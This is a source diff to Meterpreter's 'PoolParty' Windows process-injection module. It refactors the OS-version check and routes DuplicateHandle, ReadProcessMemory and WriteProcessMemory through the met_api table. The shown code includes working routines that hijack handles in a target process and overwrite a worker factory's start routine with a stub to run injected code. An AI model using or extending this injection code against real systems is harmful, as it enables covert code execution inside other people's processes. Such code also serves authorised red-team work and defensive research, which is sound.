@@ -1,7 +1,11 @@
+#ifndef _METERPRETER_POOLPARTY_C
+#define _METERPRETER_POOLPARTY_C
+#include "pool_party_ext.h"
 #include "common.h"
 #include "common_metapi.h"
 #include "pool_party.h"
 #include "pool_party_ext.h"
+
 
 NtDll* pNtDll = NULL;
 POOLPARTY_INJECTOR* poolLifeguard = NULL;
@@ -142,24 +146,53 @@ POOLPARTY_INJECTOR* GetOrInitPoolParty(DWORD dwSourceArch, DWORD dwDestinationAr
 // wow64 -> x64 (tp_direct_insertion)
 
 BOOL supports_poolparty_injection(DWORD dwSourceArch, DWORD dwDestinationArch) {
-    OSVERSIONINFO os = {0};
-    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-    NTSTATUS (*pRtlGetVersion)(OSVERSIONINFO* os) = (NTSTATUS (*)(OSVERSIONINFO* os))GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
-    dprintf("[INJECT][supports_poolparty_injection] RtlGetVersion: %p", pRtlGetVersion);
-    if (!pRtlGetVersion(&os)) {
-        dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d", dwSourceArch, dwDestinationArch);
-        dprintf("[INJECT][supports_poolparty_injection] os.dwMajorVersion: %d os.dwMinorVersion: %d", os.dwMajorVersion, os.dwMinorVersion);
-        if (os.dwMajorVersion >= 10) {
-            if (dwDestinationArch == PROCESS_ARCH_X64 && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) {
-                return TRUE;  // tp_direct_insertion
-            }
-            BOOL bIsWow64 = FALSE;
-            BOOL bResult = IsWow64Process(GetCurrentProcess(), &bIsWow64);
-            if (dwDestinationArch == PROCESS_ARCH_X86 && dwSourceArch == PROCESS_ARCH_X86 && !bIsWow64 && bResult != 0) {
-                return TRUE;
-            }
-        }
+    // Allocate OSVERSIONINFOEXW structure
+    OSVERSIONINFOEXW os = {0};
+    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
+    
+    // Get RtlGetVersion function pointer
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll == NULL) {
+        dprintf("[INJECT][supports_poolparty_injection] Failed to get ntdll.dll handle");
+        return FALSE;
     }
+    
+    typedef NTSTATUS (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);
+    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
+    
+    if (pRtlGetVersion == NULL) {
+        dprintf("[INJECT][supports_poolparty_injection] Failed to get RtlGetVersion address");
+        return FALSE;
+    }
+    
+    // Call RtlGetVersion
+    NTSTATUS status = pRtlGetVersion((PRTL_OSVERSIONINFOEXW)&os);
+    if (status != STATUS_SUCCESS) {
+        dprintf("[INJECT][supports_poolparty_injection] RtlGetVersion failed with status: 0x%x", status);
+        return FALSE;
+    }
+    
+    dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d", dwSourceArch, dwDestinationArch);
+    dprintf("[INJECT][supports_poolparty_injection] OS Version: %d.%d Build: %d", 
+            os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber);
+    
+    // Check if Windows 10 or greater (major version >= 10)
+    if (os.dwMajorVersion < 10) {
+        dprintf("[INJECT][supports_poolparty_injection] OS version is less than Windows 10");
+        return FALSE;
+    }
+    
+    // Check architecture compatibility
+    if (dwDestinationArch == PROCESS_ARCH_X64 && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) {
+        return TRUE;  // tp_direct_insertion
+    }
+    
+    BOOL bIsWow64 = FALSE;
+    BOOL bResult = IsWow64Process(GetCurrentProcess(), &bIsWow64);
+    if (dwDestinationArch == PROCESS_ARCH_X86 && dwSourceArch == PROCESS_ARCH_X86 && !bIsWow64 && bResult != 0) {
+        return TRUE;
+    }
+    
     return FALSE;
 }
 
@@ -211,7 +244,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
     }
     dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
     for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
-        if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
+        if (met_api->win_api.kernel32.DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
             ntStatus = pNtDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
             dprintf("[INJECT][inject_via_poolparty][get_remote_handle] pNtQueryObject result: %p", ntStatus);
             if (dwInformationSizeIn >= dwInformationSizeOut) {
@@ -231,7 +264,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
                     break;
                 }
             }
-            CloseHandle(hHijackHandle);
+            met_api->win_api.kernel32.CloseHandle(hHijackHandle);
         }
         hHijackHandle = INVALID_HANDLE_VALUE;
     }
@@ -281,7 +314,7 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
             if (!RemoteDirectAddress) {
                 BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_NOT_SUPPORTED)
             }
-            if (!WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
+            if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
                 BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_NOT_SUPPORTED)
             }
             dwResult = pNtDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
@@ -357,11 +390,11 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
         if (lpOriginalBytes == NULL) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] OriginalBytes is NULL", ERROR_NOT_SUPPORTED);
         }
-        if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, NULL)) {
+        if (!met_api->win_api.kernel32.ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, NULL)) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ReadProcessMemory failed.", ERROR_NOT_SUPPORTED);
         }
         SIZE_T szWritten = 0;
-        if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpStub, dwStubSize, &szWritten) || szWritten != dwStubSize) {
+        if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpStub, dwStubSize, &szWritten) || szWritten != dwStubSize) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't write stub to WorkerFactory's start routine.", ERROR_NOT_SUPPORTED);
         }
 
@@ -394,7 +427,7 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
         dprintf("[INJECT][inject_via_poolparty][DEBUG WORKER FACTORY] WorkerFactoryBasicInfo.LastThreadCreationStatus = %p", WorkerFactoryBasicInfo.LastThreadCreationStatus);
         //
 
-        if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, &szWritten) || szWritten != dwStubSize) {
+        if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, lpOriginalBytes, dwStubSize, &szWritten) || szWritten != dwStubSize) {
             BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't restore the original bytes.", ERROR_NOT_SUPPORTED);
         }
         WorkerFactoryBasicInfo.ThreadMinimum = uThreadMinimum;
@@ -454,3 +487,4 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 //	} while (0);
 //	return dwResult;
 //}
+#endif //_METERPRETER_POOLPARTY_C
